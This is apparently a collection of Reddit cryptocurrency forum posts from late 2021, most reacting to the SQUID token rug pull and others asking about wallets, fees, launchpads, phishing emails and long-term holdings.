Literally, you pay once to get your funds on to Layer 2 (half the price of a regular uniswap trade) and then all Swaps, Trades and Transfers do not require gas. **Its free.**

You can also lock your wallet and transactions on Layer 2 are instant.

**Im baffled at why this is not the standard  It works, and saves so much money on Gas.** 

Disclosure: I recently got into and hold Loopring, based on my interaction with the wallet and the potential GameStop NFT marketplace rumour.

What they have done is not a rugpull but using their 2nd token Marbles to sell Squid. Anyone could've bought Marbles to sell Squid but for the average investor it was not worth it because the marbles they bought was burned after selling squid, it was just burning money.

Squid teams statement

Someone is trying to hack our project these days. Not only the twitter account u/GoGoSquidGame but also our smart contract. We are trying to protect it but the price is still abnormal. Squid Game Dev does not want to continue running the project as we are depressed from the scammers and is overwhelmed with stress. We have to remove all the restrictions and the transaction rules of Squid Game. Squid Game will enter a new stage of community autonomy.

Sorry again for any inconvenience been made for you. If any strange starts coming out of it, ignore it. Thanks!

I was having a conversation last night with a family friend who is in crypto fairly heavily. He just became a grandfather this past year and my second son was born in February. We were both shooting the shit about what tokens would be a worth while investment for the 10-20year range for our children and grandchildren. 

I said Eth and BTC (though my actual holdings this cycle are heavily ALT based), and he said he wasnt quite sure what would stand the test of time and really be the most profitable in the years to come. 

I am wondering what you degens think would be a good investment of say $1000 with a time horizon of 10yrs +. 

Curious to hear what input you have. 

Cheers guys! Enjoy this Green Day. Hopefully we start moving again soon ;)

EDIT: Im mostly thinking of cold storage on this one. Not touching assets for years to come.

EDIT II: had to buy a membership to post so now Im balls deep Boyoz

Hi! 

I'm currently starting my research called ''What effect did covid have on individual cryptocurrency investors aged 19-25?''. In my hopes to best formulate my research questions, I would like you to tell me in the comments how did your investment behaviours change during the covid pandemic. It can be something simple, like 'I became more bold with my moves' or 'I had more time to research coins because I was staying at home, so I could do more informed choices'. Let me know if you invested in any smaller coins, looked into getting in debt to invest in crypto. This is your time to shine and I need to know what you did!

I will make sure to come back here to post my updates on the research.

This will be a great help from your side, and I believe the reddit crypto scene will not disappoint me as it never has.

The launchpad space is very saturated with mostly poor projects - or launching poor ones.. The IDO season back in April was fun because literally everything was pumped. Looking across BSCPad, TrustSwap etc, lots of these projects being launched just don't do the numbers anymore that make an investment into the pad worthwhile at the moment irrespective of how strong the pad itself is. 

Has anybody had a positive experience consistently with any Launchpad right through the bull? The barrier to entry is still so high to make it worthwhile for me. I have been hunting for new Launchpads to see if any look good long term. The IDOs always look worth it judging by tronpads 100x not too long ago but the projects following this just don't seem to cut it.

A few newer projects I have come across that might be worth a watch are Thorstarter, as the first few projects looked decent, and also SkyLaunch which is in very early stages and might be worth the IDO as the project looks promising. It looks like they are doing proper due diligence on projects through an advisory council which might alleviate the inevitable failure of the launches im talking about..

What are you guys thoughts on the Launchpad space as a whole currently and are any other pads doing proper long term dd on the sustainability of the projects they are launching like Thorstarter and SkyLaunch?

They made an obvious, worthless scam token. Not being able to sell it is a BIG RED FLAG. It's not even a ponzi scheme. With them, at least the early people make money. Anybody who knows shit about cryptocurrencies saw it for what it is. 

And yet, a lot of uninformed people FOMO'd into SQUID. But, with so much mainstream media talking about Shiba inu and other random shitcoins mooning, it's understandable. [Even the BBC wrote an article about SQUID, 3 days ago](www.bbc.com/news/business-59059097.amp). Everyone wants to get in on the new big thing and get rich quick. The brand played a major role, even though the devs have nothing to do with the actual Netflix series.

The devs exploited the hype around memecoins and successfully sold a very obvious scam. Now they're raking in profits.

If you haven't already seen, we witnessed one of the biggest, if not the biggest, rug pull in crypto history. SQUID coin, inspired by the Netflix Series Squid Game went from 2800$ down to 0,0008$ in just five minutes. The creator literally stole all the people's money. 

The fun fact is that people knew that when buying it they couldn't be able to sell. It makes no fucking sense right? 

Please don't try to find the next Shiba or the 1000x coin and don't waste your money in such scams. It's inevitable that in the end you will be the one losing money. 

At least this has gotten extreme popularity due to this sub and articles (even BBC published about it) and people will learn their lesson. I definitely feel sad for those who lost money but now you know. I hope you do.

As now all people realized that Squid Game (SQUID) has been rug pulled we need to discuss what this means for the future of Crypto. 

We (or at least most of us) all knew that squid game was a scam and will be rugpulled sooner or later. Yes it's a fucked situation and you really should do some research before you invest into any coin. I feel sorry for those who lost all of their money and hope they didn't invest too much.

But my bigger problem with the whole situation is: Mainstream media will sell this as "Crypto is bad and dangerous". Yes crypto is a riskier investment than letting your money on the bank and paying 1% of fees. But if you do some DYOR you should be fine. I never had any issues and I guess this is due to not investing into obvious scams.

I just hope that this whole mess of a situation won't be generalized into Crypto as a whole.

Puppy coins were flipping each other in the top 10 when he searching for the next meme coin. He was so moved by the news that someone became a billionaire with just few thousand dollars investment in SHIB. 

He came to know about Squid Game through Tik Tok and put his hard-earned 1226 USD into this coin. He had to jump many hoops and spent t a lot gas fee to get to pancake swap to buy this shit coin. It was trading at around 12.50 bucks then.

He tried to sell a portion of it when he made  7X. But he realised that he was not able to exchange it with any other coin in the Dex.  He thought it was because of low liquidity. Even after liquidity increased he was not able to sell it.  He then thought there might be some kind of vesting schedule, where initial investors like him could sell it later (LOL). He was okay with the fact that he was forced to hodl it, and he saw tremendous gains.  He almost became a millionaire for real.

But just few hours ago, every thing [disappeared. It](https://disappeared.It) is zero now. The Tik Tok guy who he had been following has just disappeared. The website is not reachable, and the discord is locked. 

He just told me this now.  Can't believe some one I know in real life has become a victim of this huge rug pull!

I've been seeing these posts since the London update saying that x ETH has been burned. 

&amp;#x200B;

Maybe I'm not the sharpest tool in the little house outside the big house (I have no idea how to write shed), but... If the eth never went into circulation is it really being burned?

I understand that in the purest sense of the word it is. Because it is created and burned right away. But if the currency never goes into circulation, it means that it was never valued as currency and as such, it has never existed in the first place. 

I'm thinking in terms of fiat for instance, if the central bank just decided tomorrow to print 3 trillion USD and then just (physically) burned it all joker style, would it actually do anything to the economy of the USD?

&amp;#x200B;

Maybe I'm just overcomplicating everything and I should be super bullish on ETH instead of just bullish, but if there is some smart person that can ELI12 this to me I would be very grateful!

Math. Its the real reason so many people are getting duped and losing money so easily on coins. Scout out some of the meme coin subs and youll find countless conversations of people calculating their paths to becoming a millionaire but using .1 instead of .01 and not knowing the difference between 1 cent and 10 cents. Maths is hard said one user on the meme sub. Yes, dear sir. Math is hard when you dont learn the basics first. I fear for these younger generations, and us older folks who will be cared for by them some day.

Wow the squid game rug pull was something else! i feel sorry for anybody who had got involved with that coin at its highest prices. 

Just goes to show how scummy some of the creators of coins can be people. I hope coffeezilla does some videos on this coin as it was such a mad price drop in such a short amount of time. 

Stick to the good projects guys and be safe with your hard earned money!!

Hi all 

Please be aware of the Coinmarketcap data breach. 

Shortly after midnight last night, I received an email from someone purporting to be Metamask asking me to update details, otherwise they would delete my account by a deadline of a few days.

10 minutes ago, I received an email purporting to be from Binance about Charles Hoskinson ADA giveaway. Apparently ether is going to 5K so Charles is giving away ADA? dopes. However, on iPhone this looks legitimate as they copied Binance's usual house style. The links were to participate or unsubscribe. Looking on a desktop you can see the email is not from Binance but [info@leathertouch.gr](mailto:info@leathertouch.gr). On phone though, it just shows Binance News and looks legit. Even if you don't want to click the link to participate, some people might click on unsubscribe. 

I'm so fucking pissed. I just saw last night that email had been compromised by Coinmarkcap on Have I been Pawned. 

The cowards at Coinmarketcap have not even taken responsibility, they are denying a breach and haven't flagged this with their users. 

Completely incompetent behavior. 

Please update your emails on exchanges to make sure that the email you used for Coinmarketcap is only used for that.

I'm looking for a crypto debit card that I can spend my crypto, or even better my stablecoins as USD or EUR (or any other fiat currency) using the fair live conversion rates. with no foreign transaction or conversion fees.

I was really excited about the COTI debit card but then I learned that the insane transaction fees make it completely useless.

I'm excited for the upcoming NEXO card, but now I'm worried that fees will make it unusable.

How are the fees on the [crypto.com](https://crypto.com/) card? Are there any other crypto debit cards that are worth getting or knowing about?

I want to live the crypto dream and become my own bank. I want to use crypto to pay for as many "real" things as possible, but it still seems so far away in practice.

Three days ago Squid Game crypto starting making the headlines about how it was up over 35,000% in its first three days of trading and that users were unable to sell it.

https://www.coindesk.com/markets/2021/10/29/play-to-earn-squid-token-rockets-35000-in-three-days/

Three days ago I also posted a link to an article declaring Squid Game token a scam. I found this article because I was actually interested in this coin and its massive gains that appeared out of nowhere. I was thinking it's memecoin season and hype is the biggest driver of prices right now. 

I missed out on all the hype gains recently and in the past. My thinking this time was why should I miss out on the next one? I first heard about Squid Game crypto on this sub and after less than a minute of Googling this token I saw articles saying it's a scam and can't be sold. So I did the sensible thing and avoided it. 

I think everyone who bought into Squid Game just saw the headlines about its gains and hopped aboard the hype train. To them just reading the headline was DYOR. If they DERBI then they could've seen it's a rug pull. 

Shit like this really hurts our progress but the other shitty thing is it's totally avoidable if people can just take more than second to think about what they're investing in. 

Rant over.

New to crypto and stumbled on my first mistake last week. Scoured the internet all weekend and cant find a solution. I think this money may be lost but wondered if any of you had some insight? 

Attempted to transfer USDC coin from Binance to Coinbase. Transfer went out but not received by Coinbase. 

Coinbase have said I have used the wrong network so they have not received it. 

Binance are saying they've sent it and its left them. 

I can only assume its stuck on a blockchain somewhere. Can it be recovered? 

&amp;#x200B;

Any advise would be appreciated, thanks!

Not going to sugar coat it... Everyone knew Squid Game was a scam. It wasn't even just the usual ponzi scam - it was the full on everyone loses except the creators scam.

The smallest amount of research would have shown you it was a scam. There were no redeeming qualities... Hell, it wasn't even a funny or cute meme. It was literally cashing in on the popularity of the show and incredibly stupid people.

I don't usually victim blame, but in this case anyone greedy and stupid enough to buy into this deserves everything they get.

All we can hope is that the utter insanity of this scam helps cool the shitcoin market, and encourages people to stop perpetuating the pump and dump mindset that has infested this sub over the last few months.

What precautions/steps are necessary to receive crypto for a private transaction?  Is it enough to see the coin received and in my wallet? Is there any way this could be  spoofed or faked? I can't imagine there would be any way to reverse it but sit want to confirm.  I am selling an item on Facebook marketplace which always seems to be full of scammers, he originally offered cash but then mentioned paying in Shiba Inu and to make it worth it for me I'd want more than it's direct cash value and he accepted and was willing to pay quite a bit more crypto than it's USD value. Red flags all over the place but maybe I'm just being paranoid. If I receive the payment and wait to see the change in my wallet is it possible it could be a scam? Cash makes me most comfortable knowing that once it's in my hand I am covered except for a robbery of some kind.

I don't know about you, but a 99.99% discount seems like the greatest trade deal of all trade deals so IM BUYING THE FUCKING DIP! This subreddit has constantly taught me to buy when others are fearful, and sell When others are greedy so it's time to hod all these tokens and even accumulate as many as my diamond hands can hodl! Who's with me!

On a serious note, if you did get rugpulled/scammed by this Squid Game token thing, I sure hope you use this as a learning curve to invest more diligently in the future and wish youd have a better crypto journey filled with many green dildos ahead!

Remember, Buy low, buy high, but cannot sell! is the scammiest scam of all known scams and stay safe!

$SQUID, the Squid game token fell from $2,856 to $0.0008 in under 8 minutes. This is why you should always do your own research before investing into some coin/token. 

The Squid Game project was a crypto play to earn platform on BSC chain inspired by the Korean hit series on Netflix about a deadly tournament of children's games. SQUID is the only token can be used in Squid Game. You will need SQUID to participate into a game or get restart after you fail the game.

So in order to meet the word limit

DO YOUR OWN RESEARCH DO YOUR OWN RESEARCH DO YOUR OWN RESEARCH DO YOUR OWN RESEARCH DO YOUR OWN RESEARCH DO YOUR OWN RESEARCH DO YOUR OWN RESEARCH DO YOUR OWN RESEARCH DO YOUR OWN RESEARCH DO YOUR OWN RESEARCH DO YOUR OWN RESEARCH DO YOUR OWN RESEARCH DO YOUR OWN RESEARCH DO YOUR OWN RESEARCH DO YOUR OWN RESEARCH DO YOUR OWN RESEARCH DO YOUR OWN RESEARCH DO YOUR OWN RESEARCH DO YOUR OWN RESEARCH DO YOUR OWN RESEARCH DO YOUR OWN RESEARCH DO YOUR OWN RESEARCH DO YOUR OWN RESEARCH DO YOUR OWN RESEARCH DO YOUR OWN RESEARCH DO YOUR OWN RESEARCH DO YOUR OWN RESEARCH DO YOUR OWN RESEARCH DO YOUR OWN RESEARCH DO YOUR OWN RESEARCH DO YOUR OWN RESEARCH DO YOUR OWN RESEARCH DO YOUR OWN RESEARCH

It's a crappy memecoin to begin with. It was outted as a scam on day 1 but there's non stop coverage.... Sigh..... I get it tho
Memecoin bad
Bitcoin good

But please don't cry if you invest in a memecoin and become a victim after a rugpull

Remember these principals:
1. It's only wrong if you get caught
2. There's not a problem until someone complains
3. A society is only as good as it's easiest members
4. Each individual needs to follow the law or there is no law
5. There is no law
6. Policing and police don't do shit

Stay safe everyone. It never hurts to ask questions here before investing.

May Satoshi smile upon you all and your wallets be full of coins.

Hey guys,

we often can see posts asking how to get the urge to look up prices of your crypto-investments under control. While every individual is different, there are some general aspects to human behavior that we can make use of to help ourselves.

For this case habits can be helpful. Habits can be as strong as addictions. How do we introduce a habit to get the urge under control?

Choose an activity that is driven by daily needs. For example: Using the toilet. So the habit we would try to introduce in this case is to only look up prices and check graphs if you need to use the toilet. The hardest part is  as always  the beginning phase. It takes around three weeks (for some people longer) to introduce new habits. After this time, you won't need to force yourself to not look at the price and wait for the need to use the toilet.  
It is important to not choose an activity, that can be easily increased in frequency. You can't force the need to use the toilet. Also, don't couple it with other addictions like smoking. That will lead to smoking more because the "need" to smoke will not only be triggered by nicotine addiction but also by crypto addiction.

Try it out. You only need to be strong for a few weeks and will have a goal right in front of you to concentrate on.

Good luck!

What would be the functionality of the coin? 

What consensus would you use? Looking to find other answers apart from PoS and traditional PoW but also is safe and decentralised enough.

Would there be a supply cap? What would the fees be like? 

Im doing my Engineering degree in CS right now and wanted to know a few ideas of what a perfect coin would be like according to them? This might be a part of my Major Project I have to do in my final year. But I still gotta a lot of things to do this but would be my favourite thing to do

I've said it before, Im gonna say it again - you people, working as journalists need to get your shit together.  
I didn't invest in this Squid game scam but many people did and did lose their money.   
Some were plain stupid, some were just new and got baited by the BBC article.  
Truth is journalism nowadays is such a pay-per-click horror story that journalist are rushing to post an article as quickly as possible without even doing a simple fact check, which is just ridiculous!

Do you remember the Walmart - Litecoin fiasco?  
It was the exact same thing!   
Some journalist didn't do a fact check, posted an article, some more quickly copied this article and posted it on their news websites and twitter accounts, resulting in Litecoin pumping enormously just to free fall crashing down shortly after.  
Just because some guy didn't do his job and basically misled to people because he was in a hurry.  
Same goes with other crypto related articles. We say we don't know shit about fuck, but that's just price talk. Most of the Journalists have close to zero understanding of crypto and sadly are the most vocal people on the internet.

''Do your own research'', but please keep cautious when reading articles from popular news websites.

The richest person in the world, Elon Musk, has commented on the Twitter correspondence of infamous U.S. whistleblower Edward Snowden and Reuters journalist Joel Schectman. The latter covers the topics of cyber espionage and corruption.

The Tesla chief executive responded to a screenshot of this correspondence with a laughing emoji.



 Elon Musk (@elonmusk) October 31, 2021
"Dog money" and "CLONE of dog money"

Over the weekend, a former consultant of the U.S. National Security Agency, Edward Snowden, posted a tweet against the widespread Shiba Inu mania, touching on Dogecoin as well.

He believes that SHIB is unlikely to make its investors rich since they are betting against the market that sold them its stake in what is not even just "dog money" but a "CLONE of dog money." By the former, he was obviously referring to Dogecoin in the former case and Shiba Inu in the latter.

Thirteen years ago Satoshi Nakamoto created the first coin made from ones and zeros. Today, thirteen years later, the first digital God has born. I present to you Bitgod, a philosophy, community, religion, and God. King of kings, and in the end, nothing more than a tool at the service of the mankind.

The aim of the foundation is to create a community of technocrats strong enough to solve the bigger problems of the world. Imagine if Elon Musk, Jack Dorsey, and Pavel Drov worked together under one organization. We plan to act as a shield to help the next generations of innovators to change the world. Provide them support, resources and an ethical code.

Change the world through education and hope. Change the world supporting those who will change the world.

In two months we'll have the structure of the foundation completely defined, alongside our two most valued assets: The manifesto, and the BGT. The first is our creed, the values under which the foundation is developed. The second is our token, working under the Ethereum Blockchain which allows us to manage the foundation through all its members anonymously. The manifesto is the heart of the Bitgod, and the BGTs its veins.

For now, here you can find a website which works as an interactive whitepaper, consider it the introduction to the manifesto, because it explains in an assertive and reduced way our mission.

After reading the other front page thread on SAMO, I decided to see what all the fuss was about. Installed Phantom Wallet, sent 5 SOL from [Crypto.com](https://Crypto.com)  to the Wallet (took roughly 5 mins) and then exchanged that SOL to SAMO on the Orca DEX.

This is what I discovered:

* Phantom Wallet owns Trust Wallet and Metamask. UI looks like the future - it's clean, simple and ridiculously fast.
* The SOL gas fee was  0.000015. In other words, a few cents.
* Transaction approval time was less than 1 second (instantaneous)
* I now own a small bag of yet another Dog-themed shitcoin

So why am I telling you all this? Because paying ETH gas fees is never, ever going to feel the same after this. 

ETH is my biggest holding, but now I'm REALLY hoping V2 sorts out at least a majority of the issues with network congestion and transaction times, etc.

The SOLANA network, right now, is seriously looking like the future.

My new method is simple and fast. It has also proven to be astonishingly accurate with a track record of being correct 100% of the time (except when it wasnt). 

Ive been able to forecast the new ATHs of BTC, ETH, and SHIB using my new method. The analysis also showed the sideways crab-walk weve slumped into recently. 

With the great success Ive had using this method I thought it would be the right thing to do to share it with the r/cc community!

I call this system the Functional Analysis Response Tool. You can find the link to it [HERE](https://www.ifate.com/fateball.html?fb=1). I guarantee it will bring you the answers you need for all of the coins/tokens you have questions about. 

Please know Im not a financial advisor nor is this financial advice; this is just my FART.

This one is a bit of a puzzler for me. Since late Sept/Early Oct we have seen a meteoric rise in the price, marketcap and trading volume of Meme and shitcoins. Due to it's low fees the Binance smart chain is one if not the most preferred ecosystem to create these memecoins. If you check every day onb coinmarketcap's top gainers you will see a long list of bsc coins that have shot up 1000% or more (granted they all are usually very low in marketcap initially).

Pancakeswap is by far the biggest AMM/dex on the BSC and yet this massive memecoin surge doesn't seem to have affected the token of probably the primary place right nowhere to trade for these memecoins.

Granted i am aware that it seems the current burn rate of pancakeswap (through fees, the lottery system etc) currently outnumbers the amount of new pancakeswap being created through staking. Therefore the marketcap has been steadily increasing while the price hasn't. Could this be the primary cause? I would think that a current 70% staking return from an marketplace that is much more well known would be pretty appetizing for alot of people 

Any thoughts on pancakeswap's future?

Recently I have been hearing much talk about the meta and discussions in this subreddit and other communities about which coins will be used in this meta. I just want to ask people who are part of these discussions how on earth you think crypto (which let me remind you; is all about decentralisation and freedom) will work with Facebook? The two just dont go together and I cant see a way they will possibly benefit Facebook in their path to stealing information and using it to their advantage. 
This situation has got me thinking further. Are people really only in this for the profit? Yes, I know we all want to make money just like anybody else in this world but would you really sacrifice such an important aspect in what youre investing in for faster profits?

Looking how many memecoins are going up and with all the posts lately I have a feeling that we are in one big crypto animal betting casino or whatever you would like to call it.

Since I am very bad when it comes to betting and gambling I will keep myself out of this, stand aside and be a spectator.

By the way, I'm not a gambler. I've gambled not many times in my life, a couple of time I went to play roulette, some card games, bingo and dogs, and guess what... **Every time I just lost, never won.**  

That's why I decided that it wasn't for me and that I should never go to a casino again. 

That is also the reason why I won't get into this, but I seriously wish everyone good luck with their betting. Hope you get some good profits, money is money, and if mummble rappers can get millions with that thing you should also be able to get some money by doing this. 

Be carefull though, I don't think that is good in a long run. Take those profits.

It has been talked all over the platform about a trending shitcoin named Squid apart from the Squid Games Netflix show as you may have heard million times now, and people have been investing on it, as a meme coin trend as surprisingly gained more popularity.

Now this coin has a special attribute: people can't sell them for their normal price! They are required to spend more the amount they invested to be able to sell these Squid coins back.

The price skyrocket from cents all the way to 2856$ and then took a -99.99% DUMP! This is like I'm watching Wojak investing in something and taking a massive no.

Now, how can even this be legal? Aren't there any warnings saying: "Look, this coin doesn't let you sell them, or you are required to buy X coin that has a greater amount of value than you have invested"? I'm not a typical user of PancakeSwap but even with all the decentralization, this is barely any good for the crypto community and it's just a pure rugpull scam, without any visible warnings.

Someone just created a coin from fresh fiat and stolen probably over 10 million USD, and it's probably someone no one will ever know and will have is life crazy good for the rest of his time.

If Coinbase had all coins listed, and then SquidCoin got released, do you think they would automatically list it as soon as possible? or do you think their 'quality control' would see it for what it was and protect the consumer from it?

I guess this leads on to what organisations like the SEC are trying to legislate for, which certainly seems a noble aim. But in practice, who would catch it early enough to prevent losses? 

Another point being, could Coinbase and other exchanges be forced in line with something like the  Consumer Credit Act, and reimburse consumers for fraudulent transactions...
-------------------------------

By now you've all seen that the obvious scam coin with the name based off a recently popular TV show has been rugpulled, with the creators of the coin taking off with everyone's money.

The recent run of a particular dog based memecoin has got a lot of the market and a lot of this sub super greedy and willing to gamble on clearly ridiculous projects. 

I hope that all those who are willing to gamble in these projects do so with money they can afford to lose. And know that if you do lose it, you're funding some asshole scammers next vacation.

With that being said, I wish you all the best and that all your portfolios are green.

I keep reading that cold wallets are the safest way to store your cryptos. But I dont get how it works, like everyone says that your wallet is offline, what does it means? If I lose my Ledger for example, what could I do? If someone finds my seed phrase what happens? Does he or she will be able to withdraw everything?

To be honest I truly trust myself better to use 2FA and having several hot wallets with strong passwords and everything safely managed than using a USB stick I can easily lose. 

I really feel like Im missing something here so maybe someone could enlighten myself?

So apparently the Squid Game is over. Thanks for taking part. 

To be honest, this doesn't even feel like a scam, since everything was clearly laid out in the whitepaper. Nobody (except the devs, obviously) could sell for 3 years, and this caused the token to skyrocket 100000% in just a few days. I'm sorry for the people who lost their money but I hope this serves as a lesson to young investors and people who throw their money away without doing their own research first.

coin named SQUID GAME which hit an all time high of $2,861.80 is now down to the price of an all time low of $0.0007926 this means that it can do a 3,610,648x and make you a billionare if you buy the dip that we got rn .  
and no its not a scam , the name of the coin speaks for itself. one winner and you could be that guy if the person holding the majority of the coin wants you to be and he might actually want that as well , who knows.

but with all seriousness im glad this happened, people should stop running in greed behind coins that means nothing and the money should flow to the projects that actually deserves it

Looks like Squid Game (SQUID) just got tanked by the creators. Obviously a scam token, the price went from $1,5 cents on 26 october to an astronomic $2856 just moments ago. As of just about 30 minutes ago the price of SQUID has now plummeted to about $0,0008, leaving everyone who bought in with not only a token that they cannot sell (read the whitepaper) but that is also worthless. The 'team' behind Squid Game likely took off with whatever amount of money they could get from it as the website is now unreachable. The Twitter page still exists, but is temporarily restricted, while the Medium page does not exist anymore.

I know Posting this makes me a Mooner\*\* or what ever you call.

since, people are still  buying "SQUID GAMES"(SCAM ONE) and wasting Money

I was Thinking to give an alternate crypto  with the similar name, called  The **"INTERNATIONAL SQUID GAMES".** Which was not only released before the squid games but also  has very good trading Volume Recorded from past one month.

I am not an creator of the crypto nor an Financial advisor, I am just an investor like you.

just a small advice...

it's ok to go with the Flow when MOONS and Dog's are booming ".

I gave this some thought in past few days.  


Why are we, me included, against meme coins.   


One might say it is because they add no value to market, but I would say they dont add value to US ( apart for buying them low and selling in few weeks for profits ).  


Meme coins remind me of Kardashians. They have no value in society. Plastic women that look good ( debatable, but each his own ), kids love them and will buy crap they sell. They are a brand. They are no longer people or human, they are a brand that sells.   


Same can be said for army of TikTok, Instagram, YT influencers whos biggest asset is they look good and with that sell products. What ever that product might be. And it works, really well.  

Why is that so ? I have no idea. Too old, experienced and reasonable to see through that BS.  
But younger generations or people who for what ever reason are feeling they are not as amazing as they want to be look up to these brand name people. You want Chloe parfume and for a moment smell rich ( or at least think you do ).   


There is a lesson to be learned here for ALL of us.   
Next SHIB will come. What ever meme cat - Trex - Armadilo - what have you coin it might be. Signs will be there. It will be an established coin that will go viral because Jason Mc Awesome with 10 mil followers will make a challenge to buy coins and it will go viral and pump. We should take advantage and buy / hold for a short time / sell and go back to business as usual  


We are here to make money. HODL and DCA is fantastic but when Circus comes to town its a shame to miss it and be sour in corner what many of us did and missed the good times.

You can sell Squid, you need other coin for fees called Marbles, which costs $250. In the whitepaper it is written, that you need 2 marbles per squid, then it changed to 5, then to 20. It is made so you will always spend more than gain. Only way to get gains from this was to buy on start a ton of marbles and squid, and sell yesterday night

Well, this is sad actually, so many people got scammed AGAIN
Always remember, it is better to gain 1% but a sure 1%, than to gain 100000% in 5 minutes and be 99% lose/1% win situation

I remember one guy made an analysis that you couldnt have been better than with Eth/Btc portfolio 
I hope nobody lost a lot

I myself put $1, just to try it out

For some of you, it can be seen as common sense. But so far from what we can see, that SQUID, the biggest Ponzi rugpull crypto ever created yet is slowly becoming the biggest one in the world, it doesnt look like people in this space understand basic fundamentals of crypto. 

Weve just witnessed it, the lack of education.

And it just happened, the coin went from $2800 to $0.002 in a blink of an eye. Im really sorry that millions of people just lost their life savings, investments. I know I shouldnt care too much about the others, but seeing newbies getting burned, not educating themselves enough, not asking dumb questions really triggers me.

Everyone has to start somewhere, so measure twice, cut once. Especially in crypto, where you should measure at least 100 times and then cut. 

Peace, may your losses from this rugpull shitcoin rest in peace.

Hi folks. I'm a picky old fart looking for a little entertainment, and the rise of Play-to-Earn looks pretty cool. I'm following the development of one game in particular but in the meantime I'd love to try a few others if anyone's got any recommendations. I've tried a few popular ones but find that a few things turn me off:

Axie Infinity: the cost is one thing, but the art style really isn't my thing. Feels very Pokmon, and while I know entire generations are into that, I'm not

Roguelites: same as above for pixel art

CCGs: a lot of these feature awesome art to be fair, but the gameplay is where I lose interest. Again, not a MTG or Hearthstone guy. 

So what I'm looking for, really, is something that blends interesting mechanics (strategy, TBT or RPG elements would be awesome) and nice visuals. Anyone play something they'd like to recommend or have any resources to share?
-------------------------------
1 : 2021-11-01
People ignored warnings. We've been saying Squid is an absolute scam with no way of selling. You can only buy and it doesn't matter if it makes you a billionare. You literally can't sell. These people got burned really, REALLY badly and their view of Crypto will drastically change after getting wrecked this hard. Squid is down to pretty much zero as I'm writing this.   


These same people will cry about crypto for years to come, calling it a scam and a bubble. You know why you got scammed? Because you YOLO'd into a literal scam. I just don't understand how anyone can throw money at something without researching it at least JUST A LITTLE BIT.   


You just know some of these people will get into debt because of this fiasco. Oh well. I'm expecting this to get downvoted into shit because apparently this subreddit exists to shill absolute shitcoins now, but don't FOMO into scams. At least do a few minutes of research before you throw your hard earned money into something called squid or DogeCumshotBukkakeDickShaftCoin. Sorry for the rant. It's probably littered with grammar errors. I'm frustrated because one of my friends actually bought some of this shit despite me pretty much begging him to stay away from it and now I'll have to listen to him cry and whine about it.

Hey guys, a newbie here, been active in this community for a month ! One little question, according to the moon bot I was supposed to have some moons in my vault from round 18 of moon distribution, but when I check out my vault (it is open), there is just one sign that looks like it is loading and there are no moons next to my username? Do moons appear after a certain period of time or should I contact reddit helpdesk to see if there is an issue with my vault? 

Much thanks for any help, have a lovely day.

To any fellow Algorand governors, the voting period has started today and will be open for another 13 days.

There's only one vote available, regarding "more committing rewards".

Option a will keep governance rewards the same with 70m Algo paid out per governance period.

Option b will increase governance rewards for 2022 to 90.5m Algo per governance period, but requires locking 8% of the Algo, which will be slashed, if the governor doesn't vote or withdraws the committed Algo.

The foundation supports option A, though Option is b currently sitting at 51% support. 

&amp;#x200B;

As an anecdotal side-note, option b can be rough, if an issue occurs. For example, I'm currently unable to vote after updating the ledger to firmware 2.0.0. 

I had committed with an older firmware and this update to 2.0.0 reset the bluetooth pairing. The Algorand wallet app doesn't recognize my Ledger anymore and the rekeying to a new Ledger fails due to connection errors. If 8% of my Algo were at stake, I'd be livid. Now it just looks like I'm losing out on the governance reward.

Yesterday I decided to try pancakeswap for the first time. I had some tokens that were only available on Huobi, pancakeswap and uni swap so I decided to exchange them for USDt.
The problem is I've never used anything outside the exchanges. I really wanted to withdraw my money from huobi because I only had an account for that token.
 That being said, me being a cheap ass I decided to send USDt to metamask via heco chain net. And now it is stuck there. 
Can't find a bridge that works for either Binance or Ethereum main net. I have some Ethereum for gas but I guess I might need some HT? Tried Google this things but I should've sent it directly to one of those. What's the best way to unstuck my coins? 
Any help would be appreciated!

That has to be the biggest and quickest rugpull in history right? 

We all knew squid game was a scam as well as a rugpull and even more fucked that people couldnt take profits at all at any point and whatever the deal with winning games to get the tokens for gas fees was. The whole thing was fucked.

But still please anyone correct me if Im wrong but I dont think anything else Ive ever seen has dropped that much if its percentage in such a short time?

Im sorry for any of you whove bough that token hoping to make a quick buck. I hope it was a relatively cheap and valuable lesson about crypto and these random tokens that pop up out of no where.

Unpopular Opinion, but lately, each post that gets traction is yet another bold prediction that another bullrun is imminent. All I see is BTC to $100k end of month, ETH closing $20k end of year etc etc. 
The greed has become unreal and that normally doesnt mean good things. 
Of course, I dont know shit about fuck, so Im not gonna try and lure you into my own predictions because it would be bogus, just like every other prediction you see. 

Just remember to stay cautious, especially right now. The more it climbs the harder it falls.

This one advice will save you a lot of money in crypto. **Do not buy when you see a coin in GREEN.**

Repeat after me: I WILL NOT BUY WHEN YOU SEE THAT COIN IN THE GREEN. This is specially applicable if your coins has moon by 20% plus. If this is the case, resist the urge to FOMO and WAIT. There will be other opportunities; **there always are** or wait for the coin to stabilize and have a correction. Most of the time; after a massive PUMP the coin will definitely retract and correct before continuing the journey. When this happens, if you still believe in the project hop in when it's EITHER IN RED or at least half % the prior pump if it allow you so !

Remember to always buy the blood and sell the Green - Always resist the urge to jump on a green rocket. Most of the time you will get burn,  I DID !

Hi everybody,

I just wanted to update you all on our favorite stable coin named LTO.  /s

\-Today (in about 30min) LTO will be tradable on Kucoin, this will make it a lot easier and cheaper for our overseas friends (USA) to buy LTO.

\-Today will also be the day that the biggest mainnet update yet named "COBALT" will go live, this update will turn the B2B focused network a little bit towards B2C by adding DID ( decentralized identifiers), NFT 2.0, trust network, and new supported crypto algorithms.

\-Last week LTO also signed a deal with a (for now unknown) casino to implement the DID solutions.

&amp;#x200B;

See y'all till the next update because there is a lot more in the pipeline!

I get it, you doubled, tripled, quadifknrippled your money and now you think you can give newbies advice on how to invest their money? Jesus.  
No, dude. You got lucky a few times and thats it. Not to mention your best profits are probably from a shitcoin you never even read the whitepaper on.  
Even if you invested in the early days of Bitcoin, you still sent over your hard earned money to some stranger on the internet in exchange for some magical potatoes. Don't act like you knew it all from the beginning, because nobody did.  
What, a month ago you said a certain coin in the Top20 will pump hard and its now pumping?   
OH-MY-GOD (in Janice's voice).  
Dude, your coin is not pumping because it is a great project, even if it is, the only reason it is pumping right now is because we are in a bull market, everything eventually pumps!   
Don't kid yourself, you are not fortune teller or a highly skilled investment guru, you are just a guy who got lucky in a bull market and got an Ego boost to brag around in reddit.

Don't act like you are the new Warren Buffet and don't try to look down on new comers just because you got in some months earlier, this environment here is toxic enough even as it is.

